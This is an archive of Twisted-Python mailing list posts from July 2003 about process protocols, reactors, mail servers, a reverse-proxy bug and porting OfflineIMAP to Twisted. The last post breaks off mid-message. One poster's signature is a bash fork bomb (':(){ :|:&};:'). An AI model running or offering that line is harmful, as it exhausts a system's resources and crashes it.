p is not a Deferred, so I can't call addBoth.  It seems to work okay
without this though.  What was this supposed to be added to?

-Justin
-------------- next part --------------
A non-text attachment was scrubbed...
Name: my.py
Type: application/unknown
Size: 1199 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030725/4d6848c9/attachment.bin 

From bob at redivi.com  Fri Jul 25 12:38:09 2003
From: bob at redivi.com (Bob Ippolito)
Date: Fri, 25 Jul 2003 12:38:09 -0400
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030725154229.4531337E32@www.fastmail.fm>
Message-ID: <60234460-BEBE-11D7-B892-000A95686CD8@redivi.com>

On Friday, Jul 25, 2003, at 11:42 America/New_York, Justin Johnson 
wrote:

> Thanks for the reply.  Questions below.
>
> On Fri, 25 Jul 2003 10:39:48 -0400, "Bob Ippolito" <bob at redivi.com> 
> said:
>> That's kind of amusing.  I'm not particularly familiar with the log or
>> win32eventreactor modules... but as far as I can tell, those messages
>> mean "dude, don't use log.logOwner anymore".  It's not your fault, 
>> it's
>> the twisted team's fault for not keeping win32eventreactor up to date
>> with the latest conventions.  They're just DeprecationWarnings, so
>> they're harmless to everything other than your eyes and our pride :)
>>
>> Also, instead of using that reactor.iterate() hack.. it's better to be
>> in the habit of writing something event driven.. for example, you 
>> could
>> override the __init__ for protocol.ProcessProtocol (well, it's not
>> really overriding anything, since it doesn't have one) from your
>> subclass, stick a Deferred in the instance, and do a callback in
>> processEnded... like this:
>>
>> class MyProcessProtocol(protocol.ProcessProtocol):
>> 	def __init__(self):
>> 		self.deferred = defer.Deferred()
>>
>> 	...cut and paste your code...
>>
>> 	def processEnded(self, reason):
>> 		...cut and paste some more code...
>> 		self.deferred.callback(reason)
>
> reason is an Exception from twisted.internet.error.  It is an instance 
> of
> ProcessDone if it completes successfully.  How can this be called?  
> When
> I was using the other process.py module, it allowed me to get stdout,
> stderr, and the status.  That is really all I want to do.  So it seems
> like stdout and stderr are easy to get with the xxxReceived methods, 
> and
> then the status would have to be determined from the type of exception
> processEnded gets as the "reason" argument, right?
>
> I used to have code like...
>
> cmd = "cmd arg1 arg2"
> p = process.ProcessOpen(cmd)
> status = p.wait()
> stdout = p.stdout.read()
> stderr = p.stderr.read()
> if status != 0:
>     raise errors.CmdError(cmd, status, stdout, stderr) # an Exception I
>     defined
>
> ...and this was in a module that didn't know about twisted, and I'd
> prefer to keep it that way if possible.  What is the best way to wrap a
> class with methods that contain code like this up with twisted?  
> Attached
> is the latest version of the ProcessProtocol code which is working
> (except for not knowing exactly how to get the real status).  I'm just
> not sure what to do with it.
>
>>
>> ...cut and paste again, but throw out your for loop...
>> p.addBoth(lambda ignore: reactor.callLater(0.0, reactor.stop))
>> reactor.run()
>
> p is not a Deferred, so I can't call addBoth.  It seems to work okay
> without this though.  What was this supposed to be added to?

it was supposed to be p.deferred.addBoth

I'll look at the rest of your stuff in a bit.

-bob




From bob at redivi.com  Fri Jul 25 12:53:31 2003
From: bob at redivi.com (Bob Ippolito)
Date: Fri, 25 Jul 2003 12:53:31 -0400
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030725154229.4531337E32@www.fastmail.fm>
Message-ID: <85C3F6B3-BEC0-11D7-B892-000A95686CD8@redivi.com>


On Friday, Jul 25, 2003, at 11:42 America/New_York, Justin Johnson 
wrote:

> reason is an Exception from twisted.internet.error.  It is an instance 
> of
> ProcessDone if it completes successfully.  How can this be called?  
> When
> I was using the other process.py module, it allowed me to get stdout,
> stderr, and the status.  That is really all I want to do.  So it seems
> like stdout and stderr are easy to get with the xxxReceived methods, 
> and
> then the status would have to be determined from the type of exception
> processEnded gets as the "reason" argument, right?

This is untested, since I don't have a windows box around.. didn't 
check for syntax errors.. but I believe this will do what you want it 
to do:

-------------- next part --------------
A non-text attachment was scrubbed...
Name: my.py
Type: application/octet-stream
Size: 1723 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030725/72c52506/attachment.obj 

From justinjohnson at fastmail.fm  Fri Jul 25 13:39:34 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Fri, 25 Jul 2003 11:39:34 -0600
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <85C3F6B3-BEC0-11D7-B892-000A95686CD8@redivi.com>
References: <85C3F6B3-BEC0-11D7-B892-000A95686CD8@redivi.com>
Message-ID: <20030725173934.617B237D19@www.fastmail.fm>

Thanks much.  Yes this works.

Can someone else comment on the stability of win32eventreactor, given the
deprecation warnings I'm getting?

-Justin

On Fri, 25 Jul 2003 12:53:31 -0400, "Bob Ippolito" <bob at redivi.com> said:
> 
> On Friday, Jul 25, 2003, at 11:42 America/New_York, Justin Johnson 
> wrote:
> 
> > reason is an Exception from twisted.internet.error.  It is an instance 
> > of
> > ProcessDone if it completes successfully.  How can this be called?  
> > When
> > I was using the other process.py module, it allowed me to get stdout,
> > stderr, and the status.  That is really all I want to do.  So it seems
> > like stdout and stderr are easy to get with the xxxReceived methods, 
> > and
> > then the status would have to be determined from the type of exception
> > processEnded gets as the "reason" argument, right?
> 
> This is untested, since I don't have a windows box around.. didn't 
> check for syntax errors.. but I believe this will do what you want it 
> to do:
> 



From warner at lothar.com  Fri Jul 25 13:58:28 2003
From: warner at lothar.com (Brian Warner)
Date: Fri, 25 Jul 2003 10:58:28 -0700 (PDT)
Subject: [Twisted-Python] unlistenTCP not working?
References: <00de01c35207$2de818e0$0201a8c0@dan>
 <20030724134225.617d4fca.itamar@itamarst.org>
 <007301c35289$1cc58610$0201a8c0@dan>
Message-ID: <20030725.105828.00573123.warner@lothar.com>

> Ok, I didn't realise listenTCP returned Port objects.

Also note the returned Port object can tell you which proto/host/port it is
listening on. This means you can tell it to listen on "0" (which means "pick
the next available port") and then find out later which port number it
decided to use. This could be useful for things like the FTP data port where
each file transfer opens up a new port and the port number is sent over an
existing connection to the other end.

 p = reactor.listenTCP(0, factory)
 print "now listening on port", p.getHost()[2]


cheers,
 -Brian



From radix at twistedmatrix.com  Fri Jul 25 13:58:54 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Fri, 25 Jul 2003 13:58:54 -0400
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030725173934.617B237D19@www.fastmail.fm>
References: <85C3F6B3-BEC0-11D7-B892-000A95686CD8@redivi.com> <20030725173934.617B237D19@www.fastmail.fm>
Message-ID: <20030725175854.GA25197@radii>

On Fri, Jul 25, 2003 at 11:39:34AM -0600, Justin Johnson wrote:
> Thanks much.  Yes this works.
> 
> Can someone else comment on the stability of win32eventreactor, given the
> deprecation warnings I'm getting?

The DeprecationWarnings aren't indicative of anything other than the
fact that nobody's gotten around to updating it yet. However, I have
had a problem with the win32eventreactor before, when using it with a
Tkinter GUI. I don't know if it was Tkinter or win32eventreactor that
was causing the problem, but I think it was related to threads. It
would segfault non-deterministically (inside of Tkinter code) when I
tried to do some things. However, it was always before any of the
process code was run, so I don't think it had anything to do with
that. I just decided to switch to the select reactor, with no signal
handlers installed, and use popen(), because the processes I was
executing didn't take long.

So, all I have to say is, if you use win32eventreactor with Tkinter,
you might have some problems.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From itamar at itamarst.org  Fri Jul 25 14:00:20 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Fri, 25 Jul 2003 14:00:20 -0400
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030725173934.617B237D19@www.fastmail.fm>
References: <85C3F6B3-BEC0-11D7-B892-000A95686CD8@redivi.com>
	<20030725173934.617B237D19@www.fastmail.fm>
Message-ID: <20030725140020.6f507950.itamar@itamarst.org>

On Fri, 25 Jul 2003 11:39:34 -0600
"Justin Johnson" <justinjohnson at fastmail.fm> wrote:

> Can someone else comment on the stability of win32eventreactor, given
> the deprecation warnings I'm getting?

It's stable, but not scalable (limited to 64 events, which includes
sockets, processes and so on.) At some point sometime I will work on
Thomas Heller's new win32 reactor which fixes this, but I have no
motivation at the moment.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From justinjohnson at fastmail.fm  Fri Jul 25 14:51:21 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Fri, 25 Jul 2003 12:51:21 -0600
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030725140020.6f507950.itamar@itamarst.org>
References: <85C3F6B3-BEC0-11D7-B892-000A95686CD8@redivi.com>
 	<20030725173934.617B237D19@www.fastmail.fm> <20030725140020.6f507950.itamar@itamarst.org>
Message-ID: <20030725185121.1B75133420@www.fastmail.fm>

On Fri, 25 Jul 2003 14:00:20 -0400, "Itamar Shtull-Trauring"
<itamar at itamarst.org> said:
> On Fri, 25 Jul 2003 11:39:34 -0600
> "Justin Johnson" <justinjohnson at fastmail.fm> wrote:
> 
> > Can someone else comment on the stability of win32eventreactor, given
> > the deprecation warnings I'm getting?
> 
> It's stable, but not scalable (limited to 64 events, which includes
> sockets, processes and so on.) At some point sometime I will work on
> Thomas Heller's new win32 reactor which fixes this, but I have no
> motivation at the moment.

Okay, thanks for the info.  I may try out Thomas's code myself in the
meantime.  The lack of motivation is understandable.  Man, I wish I
didn't support windows boxes!

-Justin



From itamar at itamarst.org  Fri Jul 25 15:50:01 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Fri, 25 Jul 2003 15:50:01 -0400
Subject: [Twisted-Python] New PB connection API
Message-ID: <20030725155001.69d11afc.itamar@itamarst.org>

First sketch is in CVS. Please comment if you have any issues with it,
I'd like to refactor old APIs to use new API next.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From daleedom at hightowergroup.com  Fri Jul 25 16:22:34 2003
From: daleedom at hightowergroup.com (David A. Leedom)
Date: Fri, 25 Jul 2003 16:22:34 -0400
Subject: [Twisted-Python] Mail Server
In-Reply-To: <20030721233545.GJ10749@frobozz>
References: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>
 <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>
Message-ID: <5.2.0.9.0.20030725161924.027d6d10@mail.hightowergroup.com>

Andrew,

The problem is that I don't quite "get" Twisted yet.  The output from TAP 
does not seem to do it for me.  I need a step by step quick and dirty 
example.  Even if someone could tease out the python short-hand that the 
TAP puts out, that would help.

Thanks,

Dave Leedom

At 09:35 AM 7/22/2003 +1000, Andrew Bennetts wrote:

>On Mon, Jul 21, 2003 at 01:13:13PM -0400, David A. Leedom wrote:
> > I am new to Twisted Matrix.
> >
> > I am trying to setup an mail system that will use a database as the
> > datastore for emails, domains and user access (both pop3/imap and stmp).
> >
> > What I am looking for is a code snipit example of how to setup a POP3 and
> > SMTP server using frame work without using the TAP utility.
> >
> > I figure once I have this example then I can begin to understand the
> > documentation better.  There is something missing in the explanation of 
> how
> > things work.  It just goes over my head.
>
>Why not look at how the TAP utility does it? :)
>
>Have a look at twisted/mail/tap.py, in particular the 'updateApplication'
>method.
>
>Also, I believe that IMAP, POP3 and SMTP have all had a lot of work done on
>them in CVS recently, so it might be worth using CVS, or at least the latest
>alpha release (1.0.7 alpha 2).  They're improving quite rapidly, judging
>from the number of commits (and tests!) Jp is making.
>
>-Andrew.
>
>
>_______________________________________________
>Twisted-Python mailing list
>Twisted-Python at twistedmatrix.com
>http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>
>
>---
>Incoming mail is certified Virus Free.
>Checked by AVG anti-virus system (http://www.grisoft.com).
>Version: 6.0.498 / Virus Database: 297 - Release Date: 7/8/2003



The Hightower Group, Inc.
Information Technology Consulting

165 West Airport Road/Lititz, PA 17543
V:717-560-4002, 877-560-4002 x: 114
F:717-560-2825
www.hightowergroup.com 
-------------- next part --------------

---
Outgoing mail is certified Virus Free.
Checked by AVG anti-virus system (http://www.grisoft.com).
Version: 6.0.502 / Virus Database: 300 - Release Date: 7/18/2003

From itamar at itamarst.org  Fri Jul 25 16:31:43 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Fri, 25 Jul 2003 16:31:43 -0400
Subject: [Twisted-Python] Mail Server
In-Reply-To: <5.2.0.9.0.20030725161924.027d6d10@mail.hightowergroup.com>
References: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>
	<5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>
	<5.2.0.9.0.20030725161924.027d6d10@mail.hightowergroup.com>
Message-ID: <20030725163143.06c62ac2.itamar@itamarst.org>

On Fri, 25 Jul 2003 16:22:34 -0400
"David A. Leedom" <daleedom at hightowergroup.com> wrote:

> The problem is that I don't quite "get" Twisted yet.  The output from
> TAP does not seem to do it for me.  I need a step by step quick and
> dirty example.  Even if someone could tease out the python short-hand
> that the TAP puts out, that would help.

Read twisted/tap/mail.py


-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From exarkun at intarweb.us  Fri Jul 25 16:39:03 2003
From: exarkun at intarweb.us (Jp Calderone)
Date: Fri, 25 Jul 2003 16:39:03 -0400
Subject: [Twisted-Python] Mail Server
In-Reply-To: <5.2.0.9.0.20030725161924.027d6d10@mail.hightowergroup.com>
References: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com> <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com> <5.2.0.9.0.20030725161924.027d6d10@mail.hightowergroup.com>
Message-ID: <20030725203903.GA25109@intarweb.us>

On Fri, Jul 25, 2003 at 04:22:34PM -0400, David A. Leedom wrote:
> Andrew,
> 
> The problem is that I don't quite "get" Twisted yet.  The output from TAP 
> does not seem to do it for me.  I need a step by step quick and dirty 
> example.  Even if someone could tease out the python short-hand that the 
> TAP puts out, that would help.

  Untested:

    from twisted.internet import reactor

    from twisted import mail
    import twisted.mail.mail
    import twisted.mail.maildir

    service = mail.mail.MailService('ExampleMail')
    smtp = service.getSMTPFactory()
    pop3 = service.getPOP3Factory()

    domain = mail.maildir.MaildirDirdbmDomain(service, '/path/to/domain')
    domain.addUser('username', 'password')
    svc.addDomain('domain.name', domain)

    reactor.listenTCP(25, smtp, interface='127.0.0.1')
    reactor.listenTCP(110, pop3, interface='127.0.0.1')

    reactor.run()

  Jp


-- 
No, `Eureka' is Greek for `This bath is too hot.'
                -- Dr. Who
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030725/b6e85da6/attachment.pgp 

From mario at ruggier.org  Fri Jul 25 16:40:40 2003
From: mario at ruggier.org (Mario Ruggier)
Date: Fri, 25 Jul 2003 22:40:40 +0200
Subject: [Twisted-Python] Mail Server
In-Reply-To: <20030725163143.06c62ac2.itamar@itamarst.org>
Message-ID: <410F4E3C-BEE0-11D7-82EF-000393756786@ruggier.org>

On Vendredi, juil 25, 2003, at 22:31 Europe/Zurich, Itamar 
Shtull-Trauring wrote:
> On Fri, 25 Jul 2003 16:22:34 -0400
> "David A. Leedom" <daleedom at hightowergroup.com> wrote:
>
>> The problem is that I don't quite "get" Twisted yet.  The output from
>> TAP does not seem to do it for me.  I need a step by step quick and
>> dirty example.  Even if someone could tease out the python short-hand
>> that the TAP puts out, that would help.
>
> Read twisted/tap/mail.py

another thing i sometimes find useful is to use the tapconvert utility
to generate a corresponding TAS, and peek inside... something like:
% tapconvert -i <tapfile> -o <tasfile> -t source

mario

> -- 
> Itamar Shtull-Trauring    http://itamarst.org/
> http://www.zoteca.com -- Python & Twisted consulting




From mesozoic at polynode.com  Fri Jul 25 18:26:17 2003
From: mesozoic at polynode.com (Alex Levy)
Date: Fri, 25 Jul 2003 22:26:17 +0000
Subject: [Twisted-Python] Using ResourceSubscription with vhost
Message-ID: <20030725222617.GI282@perpetual.moxn.net>

I am using twisted-web to serve a number of virtual hosts.  I'd like one of
these virtual hosts to point to a ResourceSubscription I've got set up.

The code in the first example works, the second does not.

--- This works - /etc/twisted-web/local.d/50vhost.py ---

rs = distrib.ResourceSubscription('unix', 'socketpath')
file = static.File('/somewhere')
file.putChild('rs', rs)
root.addHost('my.domain.com', file)

--- This doesn't ---

rs = distrib.ResourceSubscription('unix', 'socketpath')
root.addHost('my.domain.com', rs)

--- snip snip ---

If I use the second example, navigating to http://my.domain.com/anything
results in a 'No such child resource' error message. So, am I missing
something that should be more obvious, or is this a real bug?

-- 
Alex Levy
WWW: http://mesozoic.geecs.org
 
"Never let your sense of morals prevent you from doing what is right."
 -- Salvor Hardin, Isaac Asimov's _Foundation_



From David.McCurley at technologist.com  Fri Jul 25 21:11:24 2003
From: David.McCurley at technologist.com (David McCurley)
Date: 25 Jul 2003 21:11:24 -0400
Subject: [Twisted-Python] ProxyClient error using ReverseProxy
Message-ID: <1059181884.14038.12.camel@mars.mccurleyweb.net>

I'm working on full reverse proxy functionality and have run into an
error (twisted 1.0.6) during some basic testing.

SYNOPSIS:

- Made a root ReverseProxyResource that goes to google from
http://localhost:8080/ in my web.tap

- Using Mozilla 1.4, hit the local url, all is okay

- Now click the refresh button and an exception is thrown in the console
window running the tap.

- Reload again and no error, reload again and exception, repeatable
every other time.

I'm not clear on the full call details but the refresh that causes the
exception has a request already queued, so when the
ProxyClient.handleRequest calls the self.father.transport.loseConnection
method, the exception triggers because the transport is a
StringTransport in the queued request and it doesn't have a
"loseConnection" method.

I've been trying to trace this to submit a patch, but its not clear to
me what the queuing is for or why this is happening, or when to call
loseConnection.

DETAILS:

Made an .rpy file and a web tap that made it the root resource:

t1.rpy
===========================
import twisted.web.proxy

resource = twisted.web.proxy.ReverseProxyResource('www.google.com', 80,
'')
===========================

In mozilla 1.4 get http://localhost:8080/

Console output:
====================
2003/07/25 19:03 EDT [HTTPChannel,0,127.0.0.1] Starting factory
<twisted.web.proxy.ProxyClientFactory instance at 0x840eccc>
2003/07/25 19:03 EDT [ProxyClient,client] Stopping factory
<twisted.web.proxy.ProxyClientFactory instance at 0x840eccc>
2003/07/25 19:03 EDT [HTTPChannel,1,127.0.0.1] Starting factory
<twisted.web.proxy.ProxyClientFactory instance at 0x8416fb4>
====================

Now click reload after a few seconds (Mozilla icon stays spinning this
time like it has an open connection its waiting on):

Console output:
====================
2003/07/25 19:04 EDT [HTTPChannel,1,127.0.0.1] Starting factory
<twisted.web.proxy.ProxyClientFactory instance at 0x8411b3c>
2003/07/25 19:04 EDT [ProxyClient,client] Traceback (most recent call
last):
          File
"/usr/lib/python2.2/site-packages/twisted/internet/default.py", line
472, in doSelect
            _logrun(selectable, _drdw, selectable, method, dict)
          File "/usr/lib/python2.2/site-packages/twisted/python/log.py",
line 65, in callWithLogger
            callWithContext({"system": lp}, func, *args, **kw)
          File "/usr/lib/python2.2/site-packages/twisted/python/log.py",
line 52, in callWithContext
            return context.call({ILogContext: newCtx}, func, *args,
**kw)
          File
"/usr/lib/python2.2/site-packages/twisted/python/context.py", line 32,
in callWithContext
            return func(*args,**kw)
        --- <exception caught here> ---
          File
"/usr/lib/python2.2/site-packages/twisted/internet/default.py", line
481, in _doReadOrWrite
            why = getattr(selectable, method)()
          File
"/usr/lib/python2.2/site-packages/twisted/internet/tcp.py", line
216, in doRead
            return self.protocol.dataReceived(data)
          File
"/usr/lib/python2.2/site-packages/twisted/protocols/basic.py", line 184,
in dataReceived
            return self.rawDataReceived(data)
          File
"/usr/lib/python2.2/site-packages/twisted/protocols/http.py", line 354,
in rawDataReceived
            self.handleResponseEnd()
          File
"/usr/lib/python2.2/site-packages/twisted/protocols/http.py", line 336,
in handleResponseEnd
            self.handleResponse(b)
          File "proxy.py", line 72, in handleResponse
             
          File
"/usr/lib/python2.2/site-packages/twisted/protocols/http.py", line 285,
in __getattr__
            return getattr(self.__dict__['s'], attr)
        exceptions.AttributeError: loseConnection
 
2003/07/25 19:04 EDT [ProxyClient,client] Stopping factory
<twisted.web.proxy.ProxyClientFactory instance at 0x8411b3c>

====================

Reload again and this time the following output happens at the console
and the Mozilla icon stops spinning like all connections are closed.

Console output:
====================
2003/07/25 19:04 EDT [HTTPChannel,2,127.0.0.1] Starting factory
<twisted.web.proxy.ProxyClientFactory instance at 0x84266ac>
2003/07/25 19:04 EDT [ProxyClient,client] Stopping factory
<twisted.web.proxy.ProxyClientFactory instance at 0x84266ac>
2003/07/25 19:04 EDT [HTTPChannel,3,127.0.0.1] Starting factory
<twisted.web.proxy.ProxyClientFactory instance at 0x84454a4>
====================

Reload again and it starts spinning and gives same type of exception
trace as above.

Any pointers on where to look or how to fix this?

Thanks,

David






From jgoerzen at complete.org  Sat Jul 26 09:48:15 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Sat, 26 Jul 2003 08:48:15 -0500
Subject: [Twisted-Python] Considering Twisted for OfflineIMAP
Message-ID: <20030726134815.GA26482@complete.org>

Hello,

I am the author of OfflineIMAP, a multi-threaded multi-account
bi-directional synchronization tool
(http://quux.org/devel/offlineimap) written in Python.

I am running up against several limitations of the current way I'm
doing things.  They include:

1. Lack of thread groups in Python, meaning that if there was a
   network error synchronizing account A, I'd also have to kill off
   the entire application and the synchronizing threads for account B
   -- I couldn't just kill of account A.

2. Various bugs in Python's threading implementation

3. imaplib.py being a stinking festering heap of crap leading to
   unmaintainable code in everything that touches it

My first plan was to just rewrite imaplib, which wouldn't be too
hard.  But someone on the OfflineIMAP list pointed me to Twisted,
which I observe already contains an IMAP library that looks nice, plus
a different paradigm that may spare me from the whole thread groups
question altogether.

My questions, then, are these:

1. How does Twisted interact with things like threads and connection
   pooling?
   
   I currently let the user control the maximum number of connections
   that are open to a given server, and whenever the code needs to
   access an IMAP server, it grabs a connection from the appropriate
   pool and uses it (using threading primitives to block if no
   connection is available.)  Can Twisted handle multiple connections
   to multiple servers doing multiple things at once?  Can it do
   connection pools?  If it needs threading to do these things, does
   it play nice with it?

3. I notice the "Deferred" object and the benefits it provides when a
   server response is expected to take some time.  I assume that some
   sort of internal threading is taking place here?

   What if the server *request* takes some time -- say, uploading a
   2MB e-mail over a dialup link.  Are we still OK with handling that
   in a non-blocking fashion?

4. The howto "book" alludes to pending improvements on the mail
   infrastructure.  Anything I should be aware of here?

5. Is there any sort of unified mail API in Twisted (like JavaMail)
   that would present me with a single API to both IMAP and Maildir
   repositories, or is that something I need to do on my own?  (I've
   already done it, so it's no big deal to do that again)

6. OfflineIMAP supports several different user interfaces (two written
   with Tkinter, 1 using Curses, and three plain console ones.)  I would
   like to reimplement the Tkinter ones with wxPython, and am glad to
   see that Twisted works well with this.

   One concern, though, is that the users can supply a list of UIs to try
   in the config file: for instance, Tk, Curses, Noninteractive.  The
   system will try each one in turn until it reaches one that works.
   (For instance, Tk may not work if the user is not in X, and Curses
   may not work if stdout is not a tty).  It looks like this may be
   problematic with Twisted since the UI selection always seems to be
   known in advance with the import commands related to the reactor.
   Any thoughts here?

Thanks!

-- John Goerzen



From andrew-twisted at puzzling.org  Sat Jul 26 11:36:05 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Sun, 27 Jul 2003 01:36:05 +1000
Subject: [Twisted-Python] Considering Twisted for OfflineIMAP
In-Reply-To: <20030726134815.GA26482@complete.org>
References: <20030726134815.GA26482@complete.org>
Message-ID: <20030726153605.GB3046@frobozz>

On Sat, Jul 26, 2003 at 08:48:15AM -0500, John Goerzen wrote:
> Hello,
> 
> I am the author of OfflineIMAP, a multi-threaded multi-account
> bi-directional synchronization tool
> (http://quux.org/devel/offlineimap) written in Python.

Ooh, nifty :)

[...]
> 
> My questions, then, are these:
> 
> 1. How does Twisted interact with things like threads and connection
>    pooling?
>    
>    I currently let the user control the maximum number of connections
>    that are open to a given server, and whenever the code needs to
>    access an IMAP server, it grabs a connection from the appropriate
>    pool and uses it (using threading primitives to block if no
>    connection is available.)  Can Twisted handle multiple connections
>    to multiple servers doing multiple things at once?  Can it do
>    connection pools?  If it needs threading to do these things, does
>    it play nice with it?

Twisted uses non-blocking sockets, so it can do an arbitrary amount of
connections (both client and server) without any threads.  Running multiple
clients (or servers) at a time is as easy as calling reactor.connectTCP more
than once.

[What happened to question 2?]

> 3. I notice the "Deferred" object and the benefits it provides when a
>    server response is expected to take some time.  I assume that some
>    sort of internal threading is taking place here?

No threading.  Deferreds aren't magical at all.  Deferreds are simply an
object a function can return to say "I don't have a result ready yet; as
soon as I've got it, I'll let you know."  The caller can then register
callbacks and errbacks that will be called when the result does become
available.

How the Deferred eventually gets called is up to the code that originally
created it; it might be the result of query sent to the network being
answered (e.g. twisted.web.client.getPage), a spawned process terminating
(e.g. twisted.internet.utils.getProcessOutput), a function call in another
thread completing (e.g. twisted.internet.threads.deferToThread), and so on.

>    What if the server *request* takes some time -- say, uploading a
>    2MB e-mail over a dialup link.  Are we still OK with handling that
>    in a non-blocking fashion?

Absolutely!  Twisted handles large transfers via a consumer/producer
interface, though, rather than with Deferreds (which are one-shot results,
rather than streaming).

> 4. The howto "book" alludes to pending improvements on the mail
>    infrastructure.  Anything I should be aware of here?

Jp has been doing a lot of great work on this recently -- you should
definitely be working with CVS rather than 1.0.6 if you can.  I don't know
much about the details, though.

> 5. Is there any sort of unified mail API in Twisted (like JavaMail)
>    that would present me with a single API to both IMAP and Maildir
>    repositories, or is that something I need to do on my own?  (I've
>    already done it, so it's no big deal to do that again)

I've no idea -- Jp?

> 6. OfflineIMAP supports several different user interfaces (two written
>    with Tkinter, 1 using Curses, and three plain console ones.)  I would
>    like to reimplement the Tkinter ones with wxPython, and am glad to
>    see that Twisted works well with this.
> 
>    One concern, though, is that the users can supply a list of UIs to try
>    in the config file: for instance, Tk, Curses, Noninteractive.  The
>    system will try each one in turn until it reaches one that works.
>    (For instance, Tk may not work if the user is not in X, and Curses
>    may not work if stdout is not a tty).  It looks like this may be
>    problematic with Twisted since the UI selection always seems to be
>    known in advance with the import commands related to the reactor.
>    Any thoughts here?

I suspect this can be dealt with, but I'm not sure off the top of my head
how... hopefully someone else can help you here.

-Andrew.




From tv at twistedmatrix.com  Sat Jul 26 12:35:03 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Sat, 26 Jul 2003 19:35:03 +0300
Subject: [Twisted-Python] Considering Twisted for OfflineIMAP
In-Reply-To: <20030726134815.GA26482@complete.org>
References: <20030726134815.GA26482@complete.org>
Message-ID: <20030726163502.GA26873@lapdog>

On Sat, Jul 26, 2003 at 08:48:15AM -0500, John Goerzen wrote:
> My first plan was to just rewrite imaplib, which wouldn't be too
> hard.  But someone on the OfflineIMAP list pointed me to Twisted,
> which I observe already contains an IMAP library that looks nice, plus
> a different paradigm that may spare me from the whole thread groups
> question altogether.

	Oooh! I'm very motivated to helping you; I've used offlineimap
	for a long time now, and I think I grok Twisted reasonably
	well.

	We're on IRC at #twisted on freenode. I'd be happy to help you
	while you are getting to know twisted.

	Andrew gave pretty good answers already, so I'll keep my
	answers short.

> 1. How does Twisted interact with things like threads and connection
>    pooling?

	You really don't want to use threads; Twisted gives you everything
	you need to implement offlineimap asynchronously.

	(There is e.g. deferToThread, used when interfacing to e.g. database
	APIs that block, but that really should not be used if possible.)

>    I currently let the user control the maximum number of connections
>    that are open to a given server, and whenever the code needs to
>    access an IMAP server, it grabs a connection from the appropriate
>    pool and uses it (using threading primitives to block if no
>    connection is available.)  Can Twisted handle multiple connections
>    to multiple servers doing multiple things at once?  Can it do
>    connection pools?  If it needs threading to do these things, does
>    it play nice with it?

	That should be pretty doable, not with thread pooling but by just
	counting the currently open IMAP connections and when the number
	is below the limit, taking more work from a queue and starting
	to process it (asynchronously).

> 4. The howto "book" alludes to pending improvements on the mail
>    infrastructure.  Anything I should be aware of here?

	I believe much of that has already happened.

> 5. Is there any sort of unified mail API in Twisted (like JavaMail)
>    that would present me with a single API to both IMAP and Maildir
>    repositories, or is that something I need to do on my own?  (I've
>    already done it, so it's no big deal to do that again)

	Well, see twisted.protocols.imap4.IMailbox for _something_.

> 6. OfflineIMAP supports several different user interfaces (two written
>    with Tkinter, 1 using Curses, and three plain console ones.)  I would
>    like to reimplement the Tkinter ones with wxPython, and am glad to
>    see that Twisted works well with this.
> 
>    One concern, though, is that the users can supply a list of UIs to try
>    in the config file: for instance, Tk, Curses, Noninteractive.  The
>    system will try each one in turn until it reaches one that works.
>    (For instance, Tk may not work if the user is not in X, and Curses
>    may not work if stdout is not a tty).  It looks like this may be
>    problematic with Twisted since the UI selection always seems to be
>    known in advance with the import commands related to the reactor.
>    Any thoughts here?

	Hmm. It seems you'd need to read the configuration before starting
	the reactor (event loop). That should be enough.

-- 
:(){ :|:&};:



From jgoerzen at complete.org  Sat Jul 26 12:40:20 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Sat, 26 Jul 2003 11:40:20 -0500
Subject: [Twisted-Python] Re: Considering Twisted for OfflineIMAP
References: <20030726134815.GA26482@complete.org> <20030726153605.GB3046@frobozz>
Message-ID: <87wue56y2z.fsf@complete.org>

Andrew Bennetts <andrew-twisted at puzzling.org> writes:

> Ooh, nifty :)

Thanks :-)
>
> Twisted uses non-blocking sockets, so it can do an arbitrary amount of
> connections (both client and server) without any threads.  Running multiple
> clients (or servers) at a time is as easy as calling reactor.connectTCP more
> than once.

Well, yes and no, I think.  Let me elaborate.

OfflineIMAP always behaves as an IMAP client, so I'll be using
twisted.protocols.imap4.IMAP4Client.  This class is written to use one
and exactly one connection to the server (it must, since it takes a
single SSL contextFactory as an arg to __init__).

OfflineIMAP would like to do, say, 4 operations at once.  For the sake
of example, let's say these four are:

1. Getting a list of messages in folder A
2. Downloading a message from folder B
3. Uploading a message to folder B
4. Deleting a message in folder C

Now, the way I'd handle this pre-twisted is that my own IMAP folder
